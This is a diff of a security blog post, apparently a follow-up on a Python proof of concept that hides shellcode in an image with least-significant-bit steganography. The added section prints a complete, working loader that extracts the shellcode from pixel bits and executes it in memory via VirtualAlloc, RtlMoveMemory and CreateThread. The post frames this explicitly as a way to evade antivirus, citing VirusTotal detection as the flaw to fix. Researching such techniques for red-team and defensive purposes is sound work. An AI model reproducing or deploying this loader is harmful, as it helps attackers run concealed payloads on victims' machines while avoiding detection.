@@ -5,26 +5,97 @@ categories:
 toc: true
 ---
 
-Around this time last year I released a blog post which covered an analysis of a PoC steganographic shellcode encoder and runner, which I wrote in Python. The aim of this project was to produce a set of scripts that abused least significant bit steganography to encode and run malicious payloads for evasion purposes. This script was able to do so, but had a pitfall which could easily lead to a trivial detection. This blog post follows my prior one and explains in detail how the technique works. You can find this linked [here](https://polygonben.github.io/defence%20evasion/Creating-Stego-payloads/)   
+Around this time last year I released a blog post which covered an analysis of a PoC steganographic shellcode encoder and runner, which I wrote in Python. The aim of this project was to produce a set of scripts that abused least significant bit steganography to encode and run malicious payloads for evasion purposes. This script was able to do so, but had a pitfall which could easily lead to a trivial detection. This blog post follows my prior one, which explains in detail how the technique works. You can find the first blog linked [here](https://polygonben.github.io/defence%20evasion/Creating-Stego-payloads/).
 
-# LSB Stego
+This blog post will detail: the new code that has been used, how it is preferential for evasion, and instructions for use.
 
-Although there are many individual technqiues to conceal data from within other digital formats, I choose Least Significant Bit (LSB) steganography to conceal the text, although in my case plaintext shellcode, from within an image. 
+# Old code pitfall
 
-As you will all know, digital images are just a collection of a large number of pixels. The colour of each individual pixels is represented as a combination of different strengths of Red, Green and Blue (RGB) colours. The strength of each of the Red, Green & Blue colours is decided by a number between 0 - 255, with 255 being the strongest. In computers, these numbers are represented as 8-digit binary number.
+As mentioned, the previous code had an issue which could lead to trivial detection by any analyst. This issue was introduced as a result of our execution method. I used the Python `ctypes` library to interface with Win32 API functions like `VirtualAlloc`, `RtlMoveMemory`, `CreateThread` and `WaitForSingleObject` to allocate memory, move shellcode into that memory, and execute it. The code can be viewed below:
 
-[![1](/assets/images/PyStegMalz/1.png)](/assets/images/PyStegMalz/1.png){: .full}
+```python
+#!/usr/bin/python
+from PIL import Image
+import ctypes
+import binascii
 
+def binary_to_text(binary_data):
+    # Convert binary data to text format
+    return ''.join(chr(int(binary_data[i:i+8], 2)) for i in range(0, len(binary_data), 8))
 
-The above shows the Least Significant Bit is the last bit in the 8-digit long binary number. This is called the LSB because changing it has little impact on the colour of each pixel. For example let's say we have an individual pixel with the following RGB representation. R = 11110110 (246), G = 00110111 (55), B = 10110101 (181). This gives the below colour.
+def decode_lsb(encoded_image_path):
+    encoded_image = Image.open(encoded_image_path)
+    
+    # Convert the image to RGB mode (if it's not already)
+    encoded_image = encoded_image.convert("RGB")
 
-[![2](/assets/images/PyStegMalz/2.png)](/assets/images/PyStegMalz/2.png){: .align-center}
+    width, heigthread = encoded_image.size
+    binary_data = ""
 
-Now let's see the impact on the colour if we change the LSB on each of the colour representations of RGB. It can now be defined like: R = 11110111 (247), G = 00110110 (54), B = 10110100 (180).
+    # Extract binary data from the least significant bits of the pixels
+    for y in range(heigthread):
+        for x in range(width):
+            pixel = encoded_image.getpixel((x, y))
+            for channel in range(3):  # 3 channels (RGB)
+                # Extract the least significant bit and append to binary data
+                binary_data += format(pixel[channel] & 1, '01')
 
-[![3](/assets/images/PyStegMalz/3.png)](/assets/images/PyStegMalz/3.png){: .align-center}
+    # Find the index of the null character '\0' to mark the end of the data
+    end_index = binary_data.find("00000000")
+    binary_data = binary_data[:end_index]
+    plaintext_data = binary_to_text(binary_data)
 
-We can now see they are practically indistinguishable from each other. LSB stego works by encoding your text in binary, by using the last digit of the each RGB representation for however many pixels is required. This will have a barely noticeable affect on the image, although it will secretly contain a message. An astute reader may have noticed that the length of the binary plaintext encoded using LSB must be <= width (in pixels) * heigthread (in pixels) * 3, otherwise there would simply not enough space to encode it. For this reason, it is good practice to choose an image which has fairly large dimensions.
+    if plaintext_data[-1:] != '"':
+        bad_char = plaintext_data[-1:]
+        plaintext_data = plaintext_data.replace(bad_char, '"')
+    hex_array = plaintext_data.split('"')
+    buffer = b''
+    for i in hex_array:
+        if i != '':
+            buffer += '{}'.format(i).encode()
+    return buffer
+
+def shellcode_exec(shellcode_raw):
+
+    shellcode = bytearray(shellcode_raw)
+
+    pointer = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                          ctypes.c_int(len(shellcode)),
+                                          ctypes.c_int(0x3000),
+                                          ctypes.c_int(0x40))
+ 
+    buffer = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+ 
+    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(pointer),
+                                     buffer,
+                                     ctypes.c_int(len(shellcode)))
+ 
+    thread = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+                                         ctypes.c_int(0),
+                                         ctypes.c_int(pointer),
+                                         ctypes.c_int(0),
+                                         ctypes.c_int(0),
+                                         ctypes.pointer(ctypes.c_int(0)))
+ 
+    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(thread),
+                                         ctypes.c_int(-1))
+
+encoded_image_path = "poc_example.png"
+shellcode_str = decode_lsb(encoded_image_path)
+shellcode = binascii.unhexlify(shellcode_str.decode().replace('\\x', ''))
+shellcode_exec(shellcode)
+```
+From the above we can see 3 functions: 
+
+* `decode_lsb()` - This function takes a file path to an stego-encoded image as input, loops through each pixel of the image, extracting purely the least-signficant encoded bit to decode and reconstruct the "secret" text
+
+* `binary_to_text()` - This function takes binary data as input and converts it to a plaintext string
+
+* `shellcode_exec()` - This function uses Win32 API to load malicious shellcode into memory and execute it
+
+From the above, the issues are introduced in the `shellcode_exec()` function. Although no malicious shellcode is stored in a "readable" format within the Python script (i.e. it is loaded into memory upon execution, when it is decoded), the functions `VirtualAlloc`, `RtlMoveMemory`, `CreateThread` & `WaitForSingleObject` do exist in plaintext within the script, and can definitely indicate malicious activity, without the malicious shellcode existing in the first place. Anti-virus detection engines may be configured to block or quarantine certain scripts containing those above file names. We can see this is the case by uploading this old steganographic shellcode runner to VirusTotal:
+
+[![1](/assets/images/PyStegMalz/1.PNG)](/assets/images/PyStegMalz/1.PNG){: .align-center}
 
 
 # Python implementation   
